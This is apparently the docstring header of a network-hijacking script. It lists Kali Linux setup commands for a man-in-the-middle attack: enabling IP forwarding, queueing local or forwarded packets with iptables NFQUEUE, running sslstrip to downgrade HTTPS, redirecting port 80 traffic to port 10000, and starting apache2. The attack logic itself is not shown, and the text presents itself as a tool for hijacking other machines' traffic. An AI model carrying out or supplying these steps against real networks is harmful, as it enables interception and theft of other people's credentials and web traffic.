"""
This script allows you to hijack http/https networks. Before you start use this commands on Kali machine
1. Enable ip forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
2. Activate your packets Queues
    - If want to test on your machine: iptables -I OUTPUT -j NFQUEUE --queue-num 0;iptables -I INPUT -j NFQUEUE --queue-num 0
    - If want to use another machine: iptables -I FORWARD -j NFQUEUE --queue-num 0
3. Enable SSLStriper: sslstrip
4. Enable prerouting: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
5. Enable your web_service: service apache2 start
"""
